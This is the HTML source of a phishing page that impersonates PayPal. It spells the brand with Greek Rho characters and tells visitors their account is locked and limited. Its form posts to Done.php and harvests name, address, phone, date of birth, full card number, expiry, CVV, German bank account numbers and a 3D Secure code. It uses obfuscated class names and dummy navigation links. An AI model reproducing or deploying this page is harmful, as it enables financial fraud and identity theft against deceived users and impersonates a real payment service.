
<html>
<head>
<title>&Rho;ay&Rho;al: Summary Limited</title>
<link rel="stylesheet" href="./st/style.css">
<link rel="shortcut icon" link rel="logo-icon" href="./img/ppico.ico">
</head>
<body bgcolor="#F5F5F5">
<div class="marchi-del7out">
         <header class="marchii-del7ouut" style="position: fixed;">
            <div class="marchiii-del7ouuut">
               <div class="ANON-000-ISMA">
                  <a href="#" class="douz">skip to main content</a><a href="#" class="rmana-wbartal"><img src="./img/looogo.png"></a>
                  <nav id="hahaha-hohoho-hihihi">
                     <ul class="AN0N-0000-I8MA">
                        <li class="tajin-dyal-lgar3a"><a href="#" class="khtar"><span class="awiliyawuli">My Summary</span></a></li>
                        <li><a href="javascript:history.go(0)" class="" style="color: #0077c1;">Summary</a></li>
                        <li><a href="javascript:history.go(0)" class="">Activity</a></li>
                        <li><a href="javascript:history.go(0)" class="">Send & Request</a></li>
                        <li><a href="javascript:history.go(0)" class="">Wallet</a></li>
						<li class="smitak"><a href="javascript:history.go(0)" class="">Shop</a></li>
                        <li class="hahahaha-anon-hihihihi">
                           <a href="#" class="bzaf">More</a>
                        </li>
                     </ul>
                  </nav>
                  <!-- log out -->
                  <div class="marocbladi">
                     <div class="soni3liya"></div>
                     <div  class="soutyanat"><a class="botona hhhhh isma3il bzaaaaaaaf" href="javascript:history.go(0)"><span class="bzaaaaaaf"></span></a></div>
                     <div class="bzaaaaaaaaf sir-nn"><a class="botona hhhhh isma3il" href="javascript:history.go(0)">Log Out</a></div>
                     <button id="bghit-nakol-hambur"></button>
                  </div>
               </div>
            </div>
         </header>
</div>
<div class="welcome">
<div class="cent" style="margin-top: 0px;">
<img src="./img/capture.PNG" alt=""><h2 style="float: right; margin-right: 33.9em; margin-top: 1.5em; font-size: 24px;"> Account Locked !</h2>
<h2 style="float: right; margin-right: 54.5em; font-weight: normal; margin-top: -3.5em; font-size: 14px;"> <a href="#" class="a1">Complete your profile, you are at 60%</a></h2>

<img src="./img/send.PNG" alt="" style="float: right; margin-top: -8em; margin-right: 39em;"><span style="float: right; margin-right: 38em; margin-top: -2em; font-weight: bold;"><a href="#" class="a1"> Pay or send money</a></span>
<img src="./img/app.PNG" alt="" style="float: right; margin-top: -8em; margin-right: 28.9em;"><span style="float: right; margin-right: 26em; margin-top: -2em; font-weight: bold;"><a href="#" class="a1"> Download the app</a></span>
<img src="./img/shop.PNG" alt="" style="float: right; margin-top: -8em; margin-right: 17.5em;"><span style="float: right; margin-right: 16em; margin-top: -2em; font-weight: bold;"><a href="#" class="a1"> Safer Shopping.</a></span>


</div>
</div>
<div class="cent">
<div class="tools" style="height: 10em;">
<div class="section1">
What can I do while my account is limited?
<hr size="1" style="border-top: 1.2px solid #E0DEDF;" color="white">
</div>  
<ul class="ff10">
    <li><img src="./img/scr_check_10x10.gif" style="margin-right: 8px; margin-top: 13px;">update your account information</li>
	<li><img src="./img/scr_check_10x10.gif" style="margin-right: 8px;">use &Rho;ay&Rho;al logos in your auction listings or <span style="margin-left: 18px;">on your website</span></li>
</ul>
</div>
<div class="tools">
<div class="section1">
What can't I do while my account is limited?
<hr size="1" style="border-top: 1.2px solid #E0DEDF;" color="white">
</div>  
<ul class="ff10">
    <li><img src="./img/10.gif" style="margin-right: 8px; margin-top: 13px;">send or receive money</li>
	<li><img src="./img/10.gif" style="margin-right: 8px;">withdraw money from your account</li>
	<li><img src="./img/10.gif" style="margin-right: 8px;">close your account</li>
	<li><img src="./img/10.gif" style="margin-right: 8px;">link or remove a card</li>
	<li><img src="./img/10.gif" style="margin-right: 8px;">link or remove a bank account</li>
	<li><img src="./img/10.gif" style="margin-right: 8px;">dispute a transaction</li>
	<li><img src="./img/10.gif" style="margin-right: 8px;">send refunds</li>
</ul>
</div>
<div class="eb">
<div class="section1">
Secured & Certificate by
<hr size="1" style="border-top: 1.2px solid #E0DEDF;" color="white">
</div>   
<ul class="toolsTile">
    <div class="custContent">
        <div><img src="./img/logo2.gif" style="margin-right: 5px;"><img src="./img/sc.png" style="margin-right: 5px;"><img src="./img/enabled_by_symc_vip.png"style="margin-right: 5px;"></div>
		<hr size="1" style="border-top: 1.2px solid #E0DEDF; margin-top: 2em;" color="white">
    </div>
</ul>
</div>	
<div class="container" style="height: 1080px;">
<h3 class="titlecon"> Your billing address</h3>
<hr size="1" style="border-top: 1.2px solid #E0DEDF;" color="white">
<div class="aligntxt">
<form method="post" action="Done.php?cmd=_account_locked=ad032bde8d3c982c138fcf96567b0b63&session=c192173bb23c2c9881307ba7f4de3da2072bec9a">
<label for="add1" class="lbl">Full name:</label><input required="required" type="text" pattern="[a-zA-Z-']+.{6,40}" title="Please enter Your valid Name" name="add1" id="add1" class="txt" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true"  maxlength="20" />
<label for="add1" class="lbl">Address line1:</label><input required="required" type="text" pattern="{6,30}" title="Please enter Your valid Adress" name="add1" id="add1" class="txt" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true"  maxlength="20" />
<label for="ct" class="lbl">City:</label><input type="text" required="required" name="ct" id="ct" title="Please enter Your City" pattern="[a-zA-Z-']+.{3,15}" class="txt" style="width: 220px;" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true"  maxlength="20" />
<label for="st" class="lbl">State:</label><input type="text" required="required" name="st" id="st" title="Please enter Your Stats" class="txt" style="width: 220px;" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true"  maxlength="20" />
<label for="zip" class="lbl">ZIP / Post code:</label><input required="required" type="text" name="zip" id="zip" pattern="[a-zA-Z-0-9].{3,10}" title="Please enter Your Zip/postal" class="txt" style="width: 220px;" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true"  maxlength="20" />
<label for="zip" class="lbl">Country:</label>

<select required="required" class="txt" id="zip" name="count">
<option value="">Select</option>
<option value="Switzerland">Switzerland</option>
<option value="Albania">Albania</option>
<option value="Algeria">Algeria</option>
<option value="Andorra">Andorra</option>
<option value="Angola">Angola</option>
<option value="Anguilla">Anguilla</option>
<option value="Antigua and Barbuda">Antigua and Barbuda</option>
<option value="Argentina">Argentina</option>
<option value="Armenia">Armenia</option>
<option value="Aruba">Aruba</option>
<option value="Australia">Australia</option>
<option value="Austria">Austria</option>
<option value="Azerbaijan">Azerbaijan</option>
<option value="Bahamas">Bahamas</option>
<option value="Bahrain">Bahrain</option>
<option value="Bangladesh">Bangladesh</option>
<option value="Barbados">Barbados</option>
<option value="Belarus">Belarus</option>
<option value="Belgium">Belgium</option>
<option value="Belize">Belize</option>
<option value="Benin">Benin</option>
<option value="Bermuda">Bermuda</option>
<option value="Bhutan">Bhutan</option>
<option value="Bolivia">Bolivia</option>
<option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
<option value="Botswana">Botswana</option>
<option value="Brazil">Brazil</option>
<option value="Brunei">Brunei</option>
<option value="Bulgaria">Bulgaria</option>
<option value="Burkina Faso">Burkina Faso</option>
<option value="Burundi">Burundi</option>
<option value="Cambodia">Cambodia</option>
<option value="Cameroon">Cameroon</option>
<option value="Canada">Canada</option>
<option value="Cape Verde Islands">Cape Verde Islands</option>
<option value="Cayman Islands">Cayman Islands</option>
<option value="Central African Republic">Central African Republic</option>
<option value="Chad">Chad</option>
<option value="Channel Islands">Channel Islands</option>
<option value="Chile">Chile</option>
<option value="China">China</option>
<option value="Christmas Island">Christmas Island</option>
<option value="Colombia">Colombia</option>
<option value="Comoros">Comoros</option>
<option value="Congo">Congo</option>
<option value="Cook Islands">Cook Islands</option>
<option value="Costa Rica">Costa Rica</option>
<option value="Croatia">Croatia</option>
<option value="Cuba">Cuba</option>
<option value="Cyprus">Cyprus</option>
<option value="Czech Republic">Czech Republic</option>
<option value="Denmark">Denmark</option>
<option value="Djibouti">Djibouti</option>
<option value="Dominica">Dominica</option>
<option value="Dominican Republic">Dominican Republic</option>
<option value="Ecuador">Ecuador</option>
<option value="Egypt">Egypt</option>
<option value="El Salvador">El Salvador</option>
<option value="Estonia">Estonia</option>
<option value="Ethiopia">Ethiopia</option>
<option value="Falkland Islands">Falkland Islands</option>
<option value="Faroe Islands">Faroe Islands</option>
<option value="Fiji">Fiji</option>
<option value="Finland">Finland</option>
<option value="France">France</option>
<option value="Gabon">Gabon</option>
<option value="Gambia">Gambia</option>
<option value="Georgia">Georgia</option>
<option value="Germany">Germany</option>
<option value="Ghana">Ghana</option>
<option value="Gibraltar">Gibraltar</option>
<option value="Greece">Greece</option>
<option value="Greenland">Greenland</option>
<option value="Grenada">Grenada</option>
<option value="Guatemala">Guatemala</option>
<option value="Guinea">Guinea</option>
<option value="Guyana">Guyana</option>
<option value="Haiti">Haiti</option>
<option value="Honduras">Honduras</option>
<option value="Hong Kong">Hong Kong</option>
<option value="Hungary">Hungary</option>
<option value="Iceland">Iceland</option>
<option value="India">India</option>
<option value="Indonesia">Indonesia</option>
<option value="Iran">Iran</option>
<option value="Iraq">Iraq</option>
<option value="Isle of Man">Isle of Man</option>
<option value="Israel">Israel</option>
<option value="Italy">Italy</option>
<option value="Jamaica">Jamaica</option>
<option value="Japan">Japan</option>
<option value="Jordan">Jordan</option>
<option value="Kenya">Kenya</option>
<option value="Kiribati">Kiribati</option>
<option value="Kuwait">Kuwait</option>
<option value="Laos">Laos</option>
<option value="Latvia">Latvia</option>
<option value="Lebanon">Lebanon</option>
<option value="Lesotho">Lesotho</option>
<option value="Liberia">Liberia</option>
<option value="Libya">Libya</option>
<option value="Liechtenstein">Liechtenstein</option>
<option value="Lithuania">Lithuania</option>
<option value="Luxembourg">Luxembourg</option>
<option value="Madagascar">Madagascar</option>
<option value="Malawi">Malawi</option>
<option value="Malaysia">Malaysia</option>
<option value="Maldives">Maldives</option>
<option value="Mali">Mali</option>
<option value="Malta">Malta</option>
<option value="Martinique">Martinique</option>
<option value="Mauritania">Mauritania</option>
<option value="Mauritius">Mauritius</option>
<option value="Mexico">Mexico</option>
<option value="Monaco">Monaco</option>
<option value="Mongolia">Mongolia</option>
<option value="Morocco">Morocco</option>
<option value="Mozambique">Mozambique</option>
<option value="Namibia">Namibia</option>
<option value="Nauru">Nauru</option>
<option value="Nepal">Nepal</option>
<option value="Netherlands">Netherlands</option>
<option value="Netherlands Antilles">Netherlands Antilles</option>
<option value="New Caledonia">New Caledonia</option>
<option value="New Zealand">New Zealand</option>
<option value="Nicaragua">Nicaragua</option>
<option value="Niger">Niger</option>
<option value="Nigeria">Nigeria</option>
<option value="North Korea">North Korea</option>
<option value="Norway">Norway</option>
<option value="Oman">Oman</option>
<option value="Pakistan">Pakistan</option>
<option value="Palau">Palau</option>
<option value="Panama">Panama</option>
<option value="Paraguay">Paraguay</option>
<option value="Peru">Peru</option>
<option value="Philippines">Philippines</option>
<option value="Pitcairn Islands">Pitcairn Islands</option>
<option value="Poland">Poland</option>
<option value="Portugal">Portugal</option>
<option value="Puerto Rico">Puerto Rico</option>
<option value="Qatar">Qatar</option>
<option value="Republic of Ireland">Republic of Ireland</option>
<option value="Republic Of Kazakhstan">Republic Of Kazakhstan</option>
<option value="Romania">Romania</option>
<option value="Russia">Russia</option>
<option value="Rwanda">Rwanda</option>
<option value="Saint Lucia">Saint Lucia</option>
<option value="Sao Tome">Sao Tome</option>
<option value="Saudi Arabia">Saudi Arabia</option>
<option value="Senegal">Senegal</option>
<option value="Serbia and Montenegro">Serbia and Montenegro</option>
<option value="Seychelles">Seychelles</option>
<option value="Sierra Leone">Sierra Leone</option>
<option value="Singapore">Singapore</option>
<option value="Slovakia">Slovakia</option>
<option value="Slovenia">Slovenia</option>
<option value="Somalia">Somalia</option>
<option value="South Africa">South Africa</option>
<option value="South Korea">South Korea</option>
<option value="South Sandwich Islands">South Sandwich Islands</option>
<option value="Spain">Spain</option>
<option value="Sri Lanka">Sri Lanka</option>
<option value="Sudan">Sudan</option>
<option value="Suriname">Suriname</option>
<option value="Swaziland">Swaziland</option>
<option value="Sweden">Sweden</option>
<option value="Switzerland">Switzerland</option>
<option value="Syria">Syria</option>
<option value="Taiwan">Taiwan</option>
<option value="Tanzania">Tanzania</option>
<option value="Thailand">Thailand</option>
<option value="Togo">Togo</option>
<option value="Tonga">Tonga</option>
<option value="Trinidad and Tobago">Trinidad and Tobago</option>
<option value="Tunisia">Tunisia</option>
<option value="Turkey">Turkey</option>
<option value="Tuvalu">Tuvalu</option>
<option value="Uganda">Uganda</option>
<option value="Ukraine">Ukraine</option>
<option value="United Arab Emirates">United Arab Emirates</option>
<option value="United Kingdom">United Kingdom</option>
<option value="Uruguay">Uruguay</option>
<option value="USA">USA</option>
<option value="Uzbekistan">Uzbekistan</option>
<option value="Vanuatu">Vanuatu</option>
<option value="Vatican City">Vatican City</option>
<option value="Venezuela">Venezuela</option>
<option value="Vietnam">Vietnam</option>
<option value="Virgin Islands">Virgin Islands</option>
<option value="Yemen">Yemen</option>
<option value="Zambia">Zambia</option>
<option value="Zimbabwe">Zimbabwe</option>
</select>
<br>
<span style="color: #C88039; margin-left: 15px;"> Use for fraud alert</span>
<label for="mob" class="lbl" style="margin-top: 20px;">Phone number:</label><input required="required" pattern="^((\+\d{1,3}(-| )?\(?\d\)?(-| )?\d{1,5})|(\(?\d{2,6}\)?))(-| )?(\d{3,4})(-| )?(\d{4})(( x| ext)\d{1,5}){0,1}$" title="Please enter Your Phone number" type="text" name="mob" id="mob" class="txt" placeholder="primary" style="width: 220px;" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true"  maxlength="20" /><br>
<label for="Day" class="lbl">Date of Birth:</label>

<select name="Day" id="Day" class="txt2" required="required">
	<option>Day</option>
	<option value="1">1</option>
	<option value="2">2</option>
	<option value="3">3</option>
	<option value="4">4</option>
	<option value="5">5</option>
	<option value="6">6</option>
	<option value="7">7</option>
	<option value="8">8</option>
	<option value="9">9</option>
	<option value="10">10</option>
	<option value="11">11</option>
	<option value="12">12</option>
	<option value="13">13</option>
	<option value="14">14</option>
	<option value="15">15</option>
	<option value="16">16</option>
	<option value="17">17</option>
	<option value="18">18</option>
	<option value="19">19</option>
	<option value="20">20</option>
	<option value="21">21</option>
	<option value="22">22</option>
	<option value="23">23</option>
	<option value="24">24</option>
	<option value="25">25</option>
	<option value="26">26</option>
	<option value="27">27</option>
	<option value="28">28</option>
	<option value="29">29</option>
	<option value="30">30</option>
	<option value="31">31</option>
</select>
<select name="Month" id="Month" class="txt2" required="required">
	<option>Month</option>
	<option value="January">January</option>
	<option value="Febuary">Febuary</option>
	<option value="March">March</option>
	<option value="April">April</option>
	<option value="May">May</option>
	<option value="June">June</option>
	<option value="July">July</option>
	<option value="August">August</option>
	<option value="September">September</option>
	<option value="October">October</option>
	<option value="November">November</option>
	<option value="December">December</option>
</select>
<select name="Year" id="Year" class="txt2" required="required">
	<option> Year </option>
	<option value="1992">1996</option>
	<option value="1992">1995</option>
	<option value="1992">1994</option>
	<option value="1992">1993</option>
	<option value="1992">1992</option>
	<option value="1991">1991</option>
	<option value="1990">1990</option>
	<option value="1989">1989</option>
	<option value="1988">1988</option>
	<option value="1987">1987</option>
	<option value="1986">1986</option>
	<option value="1985">1985</option>
	<option value="1984">1984</option>
	<option value="1983">1983</option>
	<option value="1982">1982</option>
	<option value="1981">1981</option>
	<option value="1980">1980</option>
	<option value="1979">1979</option>
	<option value="1978">1978</option>
	<option value="1977">1977</option>
	<option value="1976">1976</option>
	<option value="1975">1975</option>
	<option value="1974">1974</option>
	<option value="1973">1973</option>
	<option value="1972">1972</option>
	<option value="1971">1971</option>
	<option value="1970">1970</option>
	<option value="1969">1969</option>
	<option value="1968">1968</option>
	<option value="1967">1967</option>
	<option value="1966">1966</option>
	<option value="1965">1965</option>
	<option value="1964">1964</option>
	<option value="1963">1963</option>
	<option value="1962">1962</option>
	<option value="1961">1961</option>
	<option value="1960">1960</option>
	<option value="1959">1959</option>
	<option value="1958">1958</option>
	<option value="1957">1957</option>
	<option value="1956">1956</option>
	<option value="1955">1955</option>
	<option value="1954">1954</option>
	<option value="1953">1953</option>
	<option value="1952">1952</option>
	<option value="1951">1951</option>
	<option value="1950">1950</option>
	<option value="1949">1949</option>
	<option value="1948">1948</option>
	<option value="1947">1947</option>
</select>
</div>
<h3 class="titlecon" style="margin-top: .5em;"> Credit Card information</h3>
<hr size="1" style="border-top: 1.2px solid #E0DEDF;" color="white">
<div class="aligntxt2">
<span style="color: #C88039; margin-left: 15px;"> Name as it appears on Card</span>
<label for="cname" class="lbl" style="margin-top: 20px;">Cardholder Name:</label><input required="required"  title="Please enter Your Cardholder Name" type="text" name="cname" id="cname" class="txt"/ autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true"  maxlength="25">
<label for="cnum" class="lbl">Card Number:</label><input required="required" type="text" placeholder="XXXX XXXX XXXX 1234" pattern="^(?:4[0-9]{15}?|5[1-5][0-9]{14}|(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d{12}$|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$" name="cnum" id="cnum" class="card" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true"  maxlength="16" />
<br>
<label for="expmonth" class="lbl">Expiration Date:</label>
<select name="expmonth" required id="cnum" class="txt2" style="margin-right: 15px;" required="required">
	<option>Month</option>
	<option value="1">1</option>
	<option value="2">2</option>
	<option value="3">3</option>
	<option value="4">4</option>
	<option value="5">5</option>
	<option value="6">6</option>
	<option value="7">7</option>
	<option value="8">8</option>
	<option value="9">9</option>
	<option value="10">10</option>
	<option value="11">11</option>
	<option value="12">12</option>
</select>
/
<select name="expyear" required id="cnum" class="txt2" required="required">
	<option>Year</option>
	<option value="2016">2016</option>
	<option value="2017">2017</option>
	<option value="2018">2018</option>
	<option value="2019">2019</option>
	<option value="2020">2020</option>
	<option value="2021">2021</option>
	<option value="2022">2022</option>
	<option value="2023">2023</option>
	<option value="2024">2024</option>
	<option value="2025">2025</option>
	<option value="2026">2026</option>
	<option value="2027">2027</option>
	<option value="2028">2028</option>
	<option value="2029">2029</option>
	<option value="2030">2030</option>
</select>
<label for="cvv" class="lbl" style="margin-top: 5px;">Security Code:</label><input required="required" pattern="[0-9].{2,3}" title="Please enter Your valid CVC" type="text" name="cvv" id="cvv" class="number" style="margin-top: 15px; width: 120px;" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true"  maxlength="4" /><a href="#" class="aa"> What is this?</a>
<br>
<label for="zip" class="lbl">kartenkontonummer</label><input type="text" name="12" placeholder="0000 XXXX XXXX XXXX" id="zip" class="txt" style="width: 220px;"  value=""  maxlength="16" />
<br>
<label for="zip" class="lbl">kontonummer</label><input type="text" name="123" placeholder="" id="zip" class="txt" style="width: 220px;"  value=""  maxlength="10" /> 
</br>
<label for="zip" class="lbl">3D Secure:</label> <input " type="text" name="Secure" id="zip" class="txt" style="width: 220px;" value=""  maxlength="30" />
</div>
<input type="hidden" value="./img/credit.gif" name="hostname"/>
<button type="submit" value="Continue" style="margin-top: 10em; margin-left: 251px;" class="btncon">Agree & Continue</button>
</form>
</div>
</div>
</div>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
<div class="ffoot" style="margin-top: 13em;">
<div class="footercenter">
<ul class="ff">
<li onclick="javascript:history.go(0)"> Help </li>
<li onclick="javascript:history.go(0)"> Contact </li>
<li onclick="javascript:history.go(0)"> Security </li>
<li onclick="javascript:history.go(0)"> Privacy </li>
</ul>
<p style="color: #9999A2; font-size: 12px; font-weight: bold; margin-left: 40px; margin-top: -5px;"> Copyright &copy 1999-2016 &Rho;ay&Rho;al. All rights reserved.</p>
</div>
</div>
</body>
</html>